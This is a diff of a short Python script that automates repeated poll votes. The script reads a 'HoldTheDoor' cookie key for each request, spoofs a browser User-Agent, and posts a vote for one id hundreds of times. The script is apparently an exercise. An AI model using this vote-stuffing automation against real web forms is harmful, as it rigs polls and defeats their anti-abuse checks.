@@ -11,11 +11,13 @@ header = {
     "User-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
 }
 
-for i in range(0, 1024):
+for i in range(0, 945):
     get = requests.get(page)
     cookies = get.cookies
     dictionary = cookies.get_dict()
     key = dictionary.get('HoldTheDoor')
     payloader = {'id': '2780', 'key': key, 'holdthedoor': 'Enviar'}
-    result = requests.post(page, headers=header, data=payloader, cookies = cookies)
-    print("Vote n*{:d} send it with code {} and key {}".format(i, result, key))
+    s = requests.Session()
+    s.headers = header
+    result = s.post(page, data=payloader, cookies=cookies)
+    print("Vote n*{:d} Code:{} Key:{}".format(i, result, key))
